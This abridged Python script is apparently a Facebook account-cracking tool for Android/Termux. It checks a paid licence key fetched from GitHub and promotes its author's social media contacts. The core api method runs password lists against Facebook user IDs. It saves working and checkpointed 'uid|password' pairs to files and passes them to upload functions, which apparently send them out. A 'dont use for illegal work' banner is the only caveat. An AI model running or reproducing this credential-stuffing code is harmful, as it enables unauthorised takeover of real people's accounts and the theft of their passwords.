...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://m.me/DR.N00R.AFRIDI"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/DR.NOOR.AFRIDI")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +923209083512")
	subprocess.check_output(["am", "start", "https://wa.me/+923209083512"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/NOOR-AFRIDI/Paid/blob/main/Approval.txt').text
			if basesplit in plr:
				key = basesplit
		...
		print ("""_____ _______     __       _____ _    _           ______ _____  _____ _____ _____
     /\   |  ____|  __ \|_   _|  __ \_   _|
    /  \  | |__  | |__) | | | | |  | || |  
   / /\ \ |  __| |  _  /  | | | |  | || |  
  / ____ \| |    | | \ \ _| |_| |__| || |_ 
 ...
 > \033[0;92mDEVELOPER     : DOCTOR AFRIDI
 > \033[0;95mFACEBOOK ID   : DR NOOR AFRIDI
 > \033[0;41mWHATSAPP      : 007
 \033[0;96m> YOUTUBE       : DR NOOR AFRIDI
 > \033[0;97mWARNING       : DONT USE FOR ILLEGAL WORK    
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: Doctor): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [DOCTOR] : %s/%s -> \033[0;92m [ AFRIDI-OK:%s ]- \033[0;93m[DOCTOR-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[AFRIDI-OK😍] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [AFRIDI-OK😍] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[DOCTOR-CP😭] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [DOCTOR-CP😭] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
